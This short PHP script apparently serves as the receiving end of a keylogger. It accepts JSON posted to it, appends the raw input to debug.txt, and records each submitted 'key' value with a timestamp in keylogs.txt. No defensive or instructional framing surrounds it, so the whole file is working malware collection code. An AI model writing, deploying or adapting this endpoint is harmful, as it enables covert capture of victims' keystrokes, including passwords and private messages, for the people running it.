<?php
// Log incoming raw data to debug.txt for debugging purposes
$raw_data = file_get_contents('php://input');
$debug_file = fopen("debug.txt", "a");
fwrite($debug_file, "Raw data: " . $raw_data . "\n");
fclose($debug_file);

$data = json_decode($raw_data, true);

if (isset($data['key'])) {
    $key = htmlspecialchars($data['key']);
    $timestamp = date("Y-m-d H:i:s");
    $file = fopen("keylogs.txt", "a");

    // Log the key with a timestamp
    fwrite($file, "$timestamp: $key\n");
    fclose($file);
}